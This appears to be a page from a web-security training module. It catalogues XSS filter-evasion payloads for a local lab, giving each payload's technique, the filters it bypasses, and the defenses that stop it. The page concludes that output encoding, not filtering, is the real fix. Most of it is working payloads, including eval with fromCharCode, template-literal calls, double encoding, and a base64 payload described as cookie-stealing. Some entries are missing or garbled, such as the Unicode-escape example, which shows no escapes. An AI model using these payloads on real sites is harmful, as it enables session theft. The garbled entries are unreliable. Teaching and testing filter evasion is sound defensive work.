06 — Filter Evasion & Obfuscation

15 payloads · Module reference: M12 · Lab endpoint: http://localhost:5000/waf-sim?q=PAYLOAD and /filter/blocklist?q=PAYLOAD
The fundamental lesson of this page: String-based and pattern-matching defenses are unwinnable. The HTML/JS specification is larger and more permissive than any blocklist. Each payload here demonstrates a specific gap in a specific type of filter. The correct defense is output encoding — not filtering.
A. HTML Encoding Tricks

Browser decodes entities inside attribute values before executing the handler.

B. JavaScript-Level Obfuscation
JS STRING CONCATKEYWORD FILTER
03
<img src=x onerror="window['al'+'ert'](1)">
TechniqueString concatenation to construct the function name at runtime BypassesFilters blocking the literal word "alert" in the attribute value Stopped byCSP; output encoding; Trusted Types; dynamic analysis (must execute to detect) NoteThe browser evaluates 'al'+'ert' at runtime = 'alert'. window['alert'] calls window.alert. Static filters see neither "alert" nor "window.alert".
JS UNICODEKEYWORD FILTER
04
<img src=x onerror="alert(1)">
TechniqueJS Unicode escape sequences in identifier names BypassesFilters matching "alert" literally; static analysis that doesn't resolve Unicode escapes Stopped byCSP; Unicode-normalising filters; output encoding NoteJS identifiers allow \uXXXX escapes. The engine resolves them before execution. alert = "alert". Works in any JS context — event handlers, script tags, eval.
JS CHAR CODEKEYWORD FILTER
05
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
TechniqueReconstruct payload string from char codes at runtime BypassesFilters for "alert", "eval", parentheses — combined with other tricks each can be individually obscured Stopped byCSP without unsafe-eval; output encoding; Trusted Types NoteString.fromCharCode(97,108,101,114,116,40,49,41) = "alert(1)". eval executes it. Char codes can themselves be further obfuscated with arithmetic: 97 → 0x61 → 48+49.
TEMPLATE LITERALPAREN FILTER
06
<img src=x onerror=alert`document.domain`>
TechniqueTagged template literal — calls alert with no parentheses BypassesFilters blocking ( and ) characters; anti-paren WAF rules Stopped byCSP; output encoding; filters that also block backtick Notealert\`1\` is equivalent to alert(["1"]). alert coerces to string. No parentheses needed. Passes WAF rules requiring open/close parens for function calls.
C. Tag Attribute Whitespace & Comment Tricks
WHITESPACEKEYWORD FILTER
07
<img src=x onerror = alert(1)>
TechniqueNewlines and spaces between attribute name, equals sign, and value BypassesFilters matching onerror= as a single token; regex that doesn't account for whitespace between name and value Stopped byDOM-level parsing; output encoding; CSP NoteHTML allows arbitrary whitespace (including newlines, tabs) between attribute name, =, and value. Browsers normalise this. Regex patterns must use \s*=\s* not just =.
JS COMMENTKEYWORD FILTER
08
<img src=x onerror="al/**/ert(1)">
TechniqueJS block comment inserted in the middle of the function name BypassesFilters matching "alert" literally — the word is split Stopped byJS comment-stripping before keyword check; CSP; output encoding Noteal/**/ert — in JavaScript, /* */ comments are whitespace and cannot appear inside an identifier. This does NOT actually work as a JS identifier bypass. However, some WAFs naively strip comments first creating their own bypass. Use with care when testing WAF logic specifically.
D. Null Bytes & Special Characters
NULL BYTEC-STYLE FILTER
09
<scri%00pt>alert(1)</scri%00pt>
TechniqueNull byte (%00) inside tag name BypassesC-string-based filters that stop at null byte (the filter sees "scri", browser ignores null and sees "script") Stopped byModern browsers largely ignore null bytes in tag names too; this works in specific legacy environments. Null byte stripping before filtering; output encoding NoteClassic C-string truncation bypass. In languages where strings are null-terminated (older PHP, C), the filter stops at %00. The browser's HTML tokeniser ignores the null byte and reads the full tag name. Effective against PHP 4/5-era WAFs.
DOUBLE ENCODINGSINGLE-DECODE FILTER
10
%253Cscript%253Ealert(1)%253C%252Fscript%253E
TechniqueDouble URL-encoding: %25=%, so %253C decodes first to %3C, then to < BypassesServers/WAFs that URL-decode once then pass to the app; app decodes again Stopped byNormalising to fully decoded form before any check; rejecting double-encoded input; output encoding NoteWorks when the WAF decodes once (sees %3Cscript%3E — might pass), then the app decodes again (sees <script>). The check and the execution model different decode depths.
E. Splitting Across Boundaries
STRING SPLITSAMY TECHNIQUE
11
<img src=x onerror="java script:alert(1)"> /* Note: newline inside javascript: — some older browsers skip whitespace in URI schemes */
TechniqueLiteral newline inside the keyword "javascript" to split it across two lines BypassesFilters matching "javascript" as a single-line string; the Samy worm used exactly this to bypass MySpace's "javascript" keyword filter Stopped byNormalising whitespace before keyword matching; output encoding; CSP NoteThe Samy worm used java\nscript split across a CSS background property. Some browsers (IE of the era) accepted the split scheme. Modern browsers are more strict, but the technique demonstrates that newlines must be stripped before scheme matching.

BASE64 PAYLOADCONTENT SCAN
13
<img src=x onerror=eval(atob`YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`)>
TechniqueBase64-encoded payload decoded at runtime via atob, executed via eval + backtick (no parens for atob) BypassesFilters scanning for "cookie", "document", "alert" — none appear in the payload string Stopped byCSP without unsafe-eval; output encoding; Trusted Types NoteThe base64 decodes to alert(document.cookie). atob is called with template literal (no parens). Combined with eval, this is a complete keyword-free cookie-stealing payload. Change the base64 for any payload.
MUTATIONRECURSIVE FILTER
14
<img src=x one</p>rror=alert(1)>
TechniqueBroken tag inside attribute name — parser closes the broken </p> and reconstructs attribute BypassesFilters checking the pre-parse string for "onerror" — the string contains "one</p>rror" not "onerror" Stopped byDOM-based sanitizers that parse as the browser would; output encoding; CSP NoteBrowser error recovery: the parser encounters </p> inside an attribute (malformed), closes it, and continues parsing the img tag. The attribute name "onerror" is assembled from fragments across the recovery. Filter sees neither "onerror" nor a <script>.
BACKTICK ATTRQUOTE FILTER
15
<img src=`x` onerror=`alert(1)`>
TechniqueBacktick as attribute value delimiter (IE/older browsers) BypassesFilters that only escape " and ' when building HTML attributes — backtick is left unescaped Stopped byModern browsers (Chrome/Firefox) treat backtick as part of unquoted attribute value, not delimiter. Works in IE. Sanitizers should also escape backtick in attribute contexts. OriginIE6/7 accepted backtick as attribute quote character. Code that escapes " and ' but not \` leaves this open in IE. Still relevant for legacy-targeting payloads and demonstrates that quote character allowlists must be exhaustive.
